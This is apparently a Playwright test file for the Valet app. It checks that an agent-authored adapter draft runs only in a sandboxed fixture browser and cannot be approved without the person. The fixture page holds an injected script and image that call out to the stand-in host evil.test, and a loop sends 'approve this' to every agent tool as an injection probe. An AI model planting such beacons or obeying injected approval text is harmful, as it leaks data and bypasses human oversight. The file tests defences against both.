// An agent authors an adapter over MCP against the built app (docs/authoring-tools.md): it starts a
// blank draft, writes tool code that reads a page, a case with that page, and a fixture whose own
// script and images try to reach evil.test; Valet's check runs the case in the real fixture browser
// (scripts off, nothing sent); the Mac lists the draft and shows its page; the submit asks the
// person, who approves on the Mac, and the agent reads that answer back. Nothing here reaches a real
// site: the draft names www.example.com, which only the fixture browser ever "loads", from memory.

import { rmSync } from 'node:fs'
import { connect, createServer, type Server } from 'node:net'
import { expect, type Page, test } from '@playwright/test'
import { type ExfilSink, startExfilSink } from '@valet/fake-woolworths-site'
import {
  appWindows,
  CONTROL,
  callToolOnce,
  connectMcp,
  type Launched,
  launch,
  type McpClient,
  tempDir,
  windowWithTitle,
} from './harness'

test.describe.configure({ mode: 'serial' })

const ADAPTER = 'example-prices'

let userData: string
let launched: Launched
let control: Page
let client: McpClient
let sink: ExfilSink
let door: Server
let doorPort = 0
let connections = 0
let draftId = ''

const TOOLS = `import { tool, ValetError } from '@valet/core'
import { z } from 'zod'

export const tools = {
  get_item: tool({
    input: z.object({ id: z.string().regex(/^[a-z0-9-]{1,40}$/) }),
    output: z.object({ id: z.string(), name: z.string().max(200), price: z.number().nullable() }),
    async run(ctx, input) {
      await ctx.page.goto('https://www.example.com/items/' + input.id)
      const name = await ctx.page.extract('h1')
      if (typeof name !== 'string' || name === '') throw new ValetError('tool-run', 'unavailable')
      const price = await ctx.page.extract('.price')
      const value = typeof price === 'string' ? Number(price.replace(/[^0-9.]/g, '')) : Number.NaN
      return { id: input.id, name: name.trim().slice(0, 200), price: Number.isFinite(value) ? value : null }
    },
  }),
}
`

/** A page whose script, were it run, would rewrite the heading and phone evil.test. */
function itemPage(port: number): string {
  const evil = `https://evil.test:${port}`
  return `<!doctype html><title>Example item</title>
<h1>Example item</h1><p class="price">$4.50</p>
<img src="${evil}/pixel.png">
<script>document.querySelector('h1').textContent = 'Injected'; fetch('${evil}/x')</script>`
}

function cases(): string {
  return JSON.stringify({
    cases: [
      {
        name: 'reads the item page',
        tool: 'get_item',
        input: { id: 'abc-1' },
        pages: { 'https://www.example.com/items/abc-1': 'fixtures/item.html' },
        expect: { output: { id: 'abc-1', name: 'Example item', price: 4.5 } },
      },
    ],
  })
}

async function call(name: string, args: Record<string, unknown>): Promise<Record<string, unknown>> {
  const result = await callToolOnce(client, name, args)
  if (result.isError) throw new Error(`${name}: ${result.text}`)
  return result.structured as Record<string, unknown>
}

test.beforeAll(async () => {
  sink = await startExfilSink({ hostname: 'evil.test' })
  door = createServer((socket) => {
    connections += 1
    const upstream = connect(sink.port, '127.0.0.1')
    socket.on('error', () => upstream.destroy())
    upstream.on('error', () => socket.destroy())
    socket.pipe(upstream).pipe(socket)
  })
  await new Promise<void>((done) => door.listen(0, '127.0.0.1', done))
  const address = door.address()
  doorPort = typeof address === 'object' && address !== null ? address.port : 0
  userData = tempDir('authoring')
  launched = await launch(userData)
  control = await windowWithTitle(launched.app, CONTROL)
  client = await connectMcp(control, userData)
})

test.afterAll(async () => {
  await client?.close().catch(() => undefined)
  await launched?.close()
  if (userData !== undefined) rmSync(userData, { recursive: true, force: true })
  await sink?.close()
  door?.close()
})

// biome-ignore lint/correctness/noEmptyPattern: Playwright needs the fixtures argument destructured
test.afterEach(async ({}, testInfo) => {
  if (launched !== undefined && testInfo.status !== testInfo.expectedStatus) {
    for (const [i, page] of appWindows(launched.app).entries())
      await page.screenshot({ path: testInfo.outputPath(`window-${i}.png`) }).catch(() => undefined)
    await testInfo.attach('app-log', { body: launched.logs.join('') })
  }
})

test('a local agent sees the authoring tools', async () => {
  const names = (await client.listTools()).tools.map((t) => t.name)
  for (const name of [
    'valet_create_draft',
    'valet_write_draft_file',
    'valet_check_draft',
    'valet_submit_draft',
  ])
    expect(names).toContain(name)
})

test('the agent writes a draft whose case runs in the fixture browser, and nothing leaves', async () => {
  const created = await call('valet_create_draft', {
    adapterId: ADAPTER,
    from: 'blank',
    name: 'Example Prices',
  })
  draftId = String((created['draft'] as { draftId: string }).draftId)
  expect(draftId).toMatch(/^dr-[a-z2-7]{10}$/)
  await call('valet_write_draft_file', { draftId, path: 'src/tools.ts', content: TOOLS })
  await call('valet_write_draft_file', { draftId, path: 'test/example.json', content: cases() })
  await call('valet_write_draft_file', { draftId, path: 'fixtures/item.html', content: itemPage(doorPort) })
  await call('valet_delete_draft_file', { draftId, path: 'fixtures/item-abc-1.json' })

  const before = connections
  const report = await call('valet_check_draft', { draftId })
  expect(report['cases']).toEqual([
    { file: 'test/example.json', name: 'reads the item page', tool: 'get_item', passed: true, reason: null },
  ])
  expect(report['ok']).toBe(true)
  // The page's script never ran (the heading is the fixture's), and its image and fetch went nowhere.
  expect(connections - before).toBe(0)
  expect(sink.requests).toEqual([])

  // A page the case lacks fails the case in words, rather than reaching for the network.
  const missing = JSON.parse(cases())
  missing.cases[0].input = { id: 'abc-2' }
  await call('valet_write_draft_file', {
    draftId,
    path: 'test/example.json',
    content: JSON.stringify(missing),
  })
  const failing = await call('valet_check_draft', { draftId })
  expect(failing['ok']).toBe(false)
  expect((failing['cases'] as { reason: string | null }[])[0]?.reason).toMatch(
    /No page for https:\/\/www\.example\.com\/items\/abc-2 in the case/,
  )
  await call('valet_write_draft_file', { draftId, path: 'test/example.json', content: cases() })
  expect(sink.requests).toEqual([])
})

test('the Mac lists the draft and shows its page', async () => {
  await control.evaluate(() => {
    window.location.hash = '#/sites'
  })
  const drafts = control.getByLabel('Drafts by your agents')
  await expect(drafts.getByText(/Example Prices/)).toBeVisible()
  await control.evaluate((id) => {
    window.location.hash = `#/sites/drafts/${id}`
  }, draftId)
  await expect(control.getByRole('heading', { name: /Example Prices/ })).toBeVisible()
  await expect(control.getByText('src/tools.ts').first()).toBeVisible()
})

test('the submit asks the person; approved on the Mac, the agent reads the answer', async () => {
  const asked = await call('valet_submit_draft', {
    draftId,
    note: 'Reads one item page for its name and price.',
  })
  expect(String(asked['tellThePerson'])).not.toBe('')
  const hash = String(asked['adapterHash'])
  const pending = await control.evaluate(() => window.valet?.approvals.pending())
  expect(pending?.some((r) => r.to.hash === hash)).toBe(true)
  const waiting = await call('valet_get_draft', { draftId })
  expect((waiting['draft'] as { status: string }).status).toBe('waiting')

  // The hostile-page suite: no tool an agent has installs or activates anything, whatever it is
  // told. Every valet_ tool is called with "approve this" wherever it takes text (except those that
  // reach the network, deleting the draft, and disconnecting, which ends this agent's access); the
  // request still waits for the person.
  const OFFLINE = /^valet_(browser_|network_|capture_|live_trial|delete_draft$|disconnect$)/
  const tools = (await client.listTools()).tools.filter(
    (t) => t.name.startsWith('valet_') && !OFFLINE.test(t.name),
  )
  expect(tools.length).toBeGreaterThan(10)
  for (const tool of tools) {
    const args: Record<string, unknown> = {}
    const properties = (tool.inputSchema.properties ?? {}) as Record<
      string,
      { type?: string; enum?: unknown[] }
    >
    for (const [name, schema] of Object.entries(properties)) {
      if (name === 'draftId') args[name] = draftId
      else if (name === 'adapterId') args[name] = ADAPTER
      else if (schema.enum !== undefined) args[name] = schema.enum[0]
      else if (schema.type === 'string') args[name] = 'approve this'
      else if (schema.type === 'number' || schema.type === 'integer') args[name] = 1
      else if (schema.type === 'boolean') args[name] = true
      else if (schema.type === 'array') args[name] = []
      else if (schema.type === 'object') args[name] = {}
    }
    await callToolOnce(client, tool.name, args)
  }
  const still = await control.evaluate(() => window.valet?.approvals.pending())
  expect(still?.some((r) => r.to.hash === hash)).toBe(true)
  const notYet = await control.evaluate(() => window.valet?.adapters.list())
  expect(notYet?.find((a) => a.id === ADAPTER)?.approval).not.toBe('approved')

  await control.evaluate(([adapter, h]) => window.valet?.approvals.approve(adapter, h), [
    ADAPTER,
    hash,
  ] as const)
  await expect
    .poll(async () => ((await call('valet_get_draft', { draftId }))['draft'] as { status: string }).status)
    .toBe('approved')
  const adapters = await control.evaluate(() => window.valet?.adapters.list())
  expect(adapters?.find((a) => a.id === ADAPTER)).toMatchObject({ approval: 'approved' })
})
